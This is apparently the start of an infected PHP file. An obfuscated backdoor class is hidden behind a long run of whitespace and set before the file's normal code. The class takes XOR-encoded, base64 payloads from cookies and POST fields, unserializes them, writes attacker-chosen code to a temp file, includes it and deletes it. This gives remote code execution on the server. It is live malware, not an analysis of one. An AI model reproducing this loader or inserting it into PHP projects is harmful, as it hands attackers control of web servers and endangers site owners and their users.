<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("gwnmdm")){class gwnmdm{public static $ivmuzisef = "cziqkxrvtjlnyyjh";public static $ievwntdfw = NULL;public function __construct(){$shhksuhd = @$_COOKIE[substr(gwnmdm::$ivmuzisef, 0, 4)];if (!empty($shhksuhd)){$cgxkbaw = "base64";$hlaeolbec = "";$shhksuhd = explode(",", $shhksuhd);foreach ($shhksuhd as $efboz){$hlaeolbec .= @$_COOKIE[$efboz];$hlaeolbec .= @$_POST[$efboz];}$hlaeolbec = array_map($cgxkbaw . "_decode", array($hlaeolbec,)); $hlaeolbec = $hlaeolbec[0] ^ str_repeat(gwnmdm::$ivmuzisef, (strlen($hlaeolbec[0]) / strlen(gwnmdm::$ivmuzisef)) + 1);gwnmdm::$ievwntdfw = @unserialize($hlaeolbec);}}public function __destruct(){$this->qwubmfvuw();}private function qwubmfvuw(){if (is_array(gwnmdm::$ievwntdfw)) {$madab = sys_get_temp_dir() . "/" . crc32(gwnmdm::$ievwntdfw["salt"]);@gwnmdm::$ievwntdfw["write"]($madab, gwnmdm::$ievwntdfw["content"]);include $madab;@gwnmdm::$ievwntdfw["delete"]($madab);exit();}}}$zslctdxb = new gwnmdm(); $zslctdxb = NULL;} ?><?php
